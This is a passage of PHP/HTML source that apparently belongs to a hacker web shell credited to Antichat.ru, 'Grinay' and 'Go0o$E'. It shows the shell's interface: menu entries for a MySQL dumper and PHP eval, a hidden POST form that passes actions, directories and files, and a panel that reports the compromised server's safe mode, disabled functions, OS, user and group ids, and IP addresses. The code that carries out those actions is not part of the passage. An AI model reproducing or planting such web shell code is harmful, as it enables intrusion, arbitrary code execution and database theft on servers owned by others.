onclick="document.reqs.action.value='mysql';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Mysql Dumper|.</a></td><td><a href="#" onclick="document.reqs.action.value='phpeval';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">.| Php Eval |.</a></td><td><a href="#" onclick="history.back();">.| <-back |.</a></td><td><a href="#" onclick="history.forward();">.| forward->|.</a></td></tr></table></td></tr></table><br><form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''><input name='file' type='hidden' value=''></form><table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#363940 borderColorLight=#c0c0c0 border=1> <tr><td>Safe mode: <?php echo $safe_mode;?><br>Disable functions: <?php echo $disfunc;?><br>OS: <?php echo @php_uname();?><br>Server: <?php echo @getenv("SERVER_SOFTWARE")?><br>Id: <?php echo "Uid=".getmyuid(). " Gid=".getmygid(); ?><br><? echo 'Server: '.@gethostbyname($_SERVER["HTTP_HOST"]).' You: '.$_SERVER['REMOTE_ADDR'].' XFF: '.@gethostbyaddr($HTTP_X_FORWARDED_FOR).' ';?></br> Status: <?php echo @$stdata;?></td></tr></table><table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#363940 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?=$content;?>
<br></table><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#44474f BORDER=1 width=100% align=center bordercolor=#808080 bordercolorlight=black bordercolordark=#44474f><tr><td><center><font color='#9acd32' face='Tahoma' size = 2><b>| COPYRIGHT BY ANTICHAT.RU | Made by Grinay | Modified by Go0o$E |</b></font></center></td></tr></table><?=$footer;?>
